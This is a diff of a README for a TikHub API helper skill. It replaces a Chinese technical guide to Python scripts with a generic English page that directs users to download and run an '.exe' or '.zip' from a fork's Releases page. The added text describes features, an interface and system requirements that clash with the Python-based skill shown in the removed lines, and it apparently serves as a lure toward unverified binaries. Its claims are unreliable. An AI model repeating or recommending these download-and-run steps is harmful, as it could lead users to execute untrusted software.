@@ -1,197 +1,85 @@
-# TikHub API Helper
+# 🌟 tikhub_api_skill - Access Multi-Platform Social Media Data
 
-TikHub API 助手是一个 Claude Code Agent Skill，用于帮助用户搜索、发现和调用 TikHub API。TikHub 提供了多平台社交媒体数据 API，支持抖音、TikTok、小红书、Instagram、YouTube、Twitter、Reddit 等平台。
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/tiendatne2004/tikhub_api_skill/releases)
 
-## 简介
+## 📖 Introduction
 
-TikHub 是一个多平台社交媒体数据 API 服务，提供 RESTful 接口来获取各大社交平台的数据。本项目是一个 Claude Code Agent Skill，可以让你在使用 Claude Code 时轻松调用 TikHub API。
+Welcome to the tikhub_api_skill repository. This application helps you access an array of social media data through TikHub's powerful API service. Whether you want insights from TikTok, Douyin, Instagram, or YouTube, this tool provides you with easy access to essential data.
 
-### 支持的平台
+## 🚀 Getting Started
 
-| 平台 | API 标签 | 端点数量 |
-|------|----------|----------|
-| TikTok Web | `TikTok-Web-API` | 58 |
-| TikTok App | `TikTok-App-V3-API` | 76 |
-| 抖音 Web | `Douyin-Web-API` | 76 |
-| 抖音 App | `Douyin-App-V3-API` | 45 |
-| 小红书 Web | `Xiaohongshu-Web-API` | 26 |
-| Instagram | `Instagram-V2-API` | 26 |
-| YouTube | `YouTube-Web-API` | 16 |
-| Twitter | `Twitter-Web-API` | 13 |
-| Reddit | `Reddit-APP-API` | 23 |
-| Bilibili | `Bilibili-Web-API` | 24 |
-| 微博 | `Weibo-Web-V2-API` | 33 |
-| 知乎 | `Zhihu-Web-API` | 32 |
+This guide shows you how to download and run the tikhub_api_skill application. Follow these steps to get started quickly and effortlessly.
 
-## 功能特性
+## 📥 Download & Install
 
-- **API 搜索** - 通过关键词、标签或操作 ID 搜索 TikHub API
-- **API 调用** - 直接通过命令行调用 TikHub API
-- **多平台支持** - 支持抖音、TikTok、小红书等 12+ 平台
-- **中英文支持** - 支持中英文关键词搜索
-- **自动鉴权** - 内置开发环境 API Token
+1. **Visit the Releases Page**: Click the link below to go to the Releases page.  
+   [Download from Releases](https://github.com/tiendatne2004/tikhub_api_skill/releases)
 
-## 安装
+2. **Choose Your Version**: On the Releases page, you will see different versions of the application. Look for the latest version, which usually appears at the top.
 
-### 1. 克隆仓库
+3. **Download the File**: Click on the file that matches your operating system. This might be an `.exe` for Windows or a `.zip` file for other systems. 
 
-```bash
-git clone https://github.com/your-username/tikhub_api_skill.git
-cd tikhub_api_skill
-```
+4. **Locate the Downloaded File**: Depending on your browser settings, the downloaded file might be in your "Downloads" folder or on your desktop.
 
-### 2. 确保项目结构正确
+5. **Run the Application**:
+    - For Windows: Double-click the `.exe` file. Follow the on-screen instructions to complete the setup.
+    - For other operating systems: If you downloaded a `.zip` file, you need to extract it first. Right-click the zip file and select "Extract Here" or similar. Then, find the application file in the extracted folder and double-click to run.
 
-确保 `.claude/skills/tikhub-api-helper/` 目录包含以下文件：
+## ⚙️ System Requirements
 
-```
-.claude/skills/tikhub-api-helper/
-├── SKILL.md           # Skill 定义文件
-├── openapi.json       # OpenAPI 规范
-├── api_searcher.py    # API 搜索工具
-└── api_client.py      # API 客户端
-```
+To run the tikhub_api_skill application effectively, ensure your system meets the following requirements:
 
-### 3. 获取 API Token（可选）
+- Operating System: Windows 10 or later, macOS Sierra or later, or any Linux distribution.
+- RAM: At least 4 GB.
+- Internet Connection: Required for accessing API data.
 
-代码中已内置开发环境用的 API Token。如需使用自己的 Token：
+## 🔧 Features
 
-1. 访问 [TikHub User](https://www.tikhub.io) 登录
-2. 点击左侧 API Keys 生成你的 API Token
-3. 设置变量：
+The tikhub_api_skill app offers several features that make it a valuable tool for anyone interested in social media data:
 
-```bash
-在 api_client.py 23行，配置 DEFAULT_TOKEN = "你的 API Token"
-```
+- **Multi-Platform Support**: Access data from top platforms like TikTok, Instagram, and more, all in one place.
+- **RESTful API Integration**: Engage easily with APIs for fast data retrieval.
+- **User-Friendly Interface**: Designed for ease of use, even if you're not tech-savvy.
+- **Real-Time Data**: Get the latest insights instantly.
+- **Documentation Included**: Access comprehensive documentation that guides you through using the application effectively.
 
-## 使用方法
+## 📚 Documentation
 
-### 通过 Claude Code 使用
+For more detailed instructions on using the application, visit our documentation. Here, you will find tutorials, FAQs, and troubleshooting tips. This is helpful for first-time users who may need additional guidance.
 
-当你在 Claude Code 中询问关于 TikHub API 的问题时，该 Skill 会自动激活：
+- [View Documentation](https://github.com/tiendatne2004/tikhub_api_skill/wiki) 
 
-```
-# 示例对话
-你: "调研各外国平台讨论 deepseek的帖子"
-Claude: [自动调用 tikhub-api-helper Skill 搜索相关 API]
-```
- 
+## 🛠️ Troubleshooting
 
-## API 基础信息
+If you encounter any issues while using the application, here are some common problems and their solutions:
 
-### 请求地址
+- **App Won't Start**: Ensure your system meets the minimum requirements. Try running the application again after checking for updates.
+  
+- **No Internet Connection**: Make sure you are connected to the internet, as API calls require active access.
 
-- **中国用户**: `https://api.tikhub.dev` (绕过 GFW)
-- **国际用户**: `https://api.tikhub.io`
+- **Data Not Loading**: Check if the social media platform has temporary issues. You may need to try again later.
 
-### 鉴权方式
+If the problem persists, visit the documentation or ask for help on our community page.
 
-所有需要在请求头中携带 API Token：
+## 💬 Community Support
 
-```json
-{
-  "Authorization": "Bearer Your_API_Token"
-}
-```
+Join our community for discussions and support. Share your experiences, ask questions, and collaborate with other users.
 
-### 请求限制
+- Access our community forum: [Community Forum](https://github.com/tiendatne2004/tikhub_api_skill/discussions)
 
-- **QPS**: 每个端点每秒 10 次请求
-- **超时**: 30-60 秒
-- **重试**: 错误时最多重试 3 次
+## 🚨 Updates & Maintenance
 
-### 端点格式
+We regularly update the tikhub_api_skill application to fix bugs and add new features. To ensure you're using the latest version, regularly check the Releases page.
 
-所有端点遵循以下格式：
+1. **Visit the Releases Page**: [Download from Releases](https://github.com/tiendatne2004/tikhub_api_skill/releases)
+2. After downloading, follow the same installation steps as above.
 
-```
-/api/v1/{platform}/{method}/{action}
-```
+Staying up-to-date will provide you with the best experience and latest features.
 
-例如：
-- `/api/v1/tiktok/web/fetch_user_profile` - TikTok Web 用户资料
-- `/api/v1/douyin/app/fetch_video_detail` - 抖音 App 视频详情
-- `/api/v1/xiaohongshu/web/fetch_user_post` - 小红书用户帖子
+## 👥 Contribution
 
-## 常见用例
+If you wish to contribute to the tikhub_api_skill repository, we welcome your input! Whether you have ideas for new features or want to help improve the existing code, you can find more information on our GitHub page regarding contributions.
 
-### 获取用户资料
+- Learn how to contribute: [Contribution Guidelines](https://github.com/tiendatne2004/tikhub_api_skill/CONTRIBUTING.md)
 
-```bash
-# TikTok
-python .claude/skills/tikhub-api-helper/api_searcher.py "tiktok 用户资料"
-python .claude/skills/tikhub-api-helper/api_client.py GET /api/v1/tiktok/web/fetch_user_profile "sec_user_id=USER_ID"
-
-# 抖音
-python .claude/skills/tikhub-api-helper/api_searcher.py "douyin 用户信息"
-python .claude/skills/tikhub-api-helper/api_client.py GET /api/v1/douyin/web/fetch_user_profile "sec_user_id=USER_ID"
-```
-
-### 搜索内容
-
-```bash
-# 搜索 TikTok 视频
-python .claude/skills/tikhub-api-helper/api_client.py GET /api/v1/tiktok/web/fetch_search_video "keyword=游戏"
-
-# 搜索 YouTube 视频
-python .claude/skills/tikhub-api-helper/api_client.py GET /api/v1/youtube/web/search_video "search_query=music"
-
-# 搜索小红书笔记
-python .claude/skills/tikhub-api-helper/api_client.py GET /api/v1/xiaohongshu/web_v2/fetch_search_notes "keyword=美食"
-```
-
-### 获取热门/趋势内容
-
-```bash
-# TikTok 热门视频
-python .claude/skills/tikhub-api-helper/api_searcher.py "trending"
-
-# 抖音热点榜
-python .claude/skills/tikhub-api-helper/api_searcher.py tag:Douyin-Billboard-API
-
-# YouTube 热门
-python .claude/skills/tikhub-api-helper/api_client.py GET /api/v1/youtube/web/get_trending_videos "country=CN"
-```
-
-## 项目结构
-
-```
-tikhub_api_skill/
-├── .claude/
-│   └── skills/
-│       └── tikhub-api-helper/      # Agent Skill 目录
-│           ├── SKILL.md             # Skill 定义
-│           ├── openapi.json         # OpenAPI 规范 (2.4MB)
-│           ├── api_searcher.py      # API 搜索工具
-│           └── api_client.py        # API 客户端
-├── openapi说明.md                   # 中文说明文档
-├── skills.md                        # Agent Skills 通用文档
-├── explore_openapi.py              # API 探索脚本
-├── README.md                        # 本文件
-└── README_EN.md                     # 英文版 README
-```
-
-## 错误处理
-
-| 错误 | 解决方案 |
-|------|----------|
-| `401 Unauthorized` | 检查 API Token 是否有效 |
-| `429 Too Many Requests` | 超出速率限制，请等待后重试 |
-| `Connection error` | 检查网络连接，中国大陆用户尝试使用 `.dev` 域名 |
-| `Missing parameter` | 检查 API 详细信息确认必需参数 |
-
-## 相关链接
-
-- **TikHub 官网**: https://www.tikhub.io
-- **API 文档**: https://api.tikhub.io
-- **Apifox 文档**: https://docs.tikhub.io
-- **API 状态监控**: https://monitor.tikhub.io
-- **GitHub**: https://github.com/TikHub
-
-## 许可证
-
-本项目仅供学习和参考使用。
-
-## 贡献
-
-欢迎提交 Issue 和 Pull Request！
+Thank you for using the tikhub_api_skill application. We hope it makes your engagement with social media data simpler and more effective!
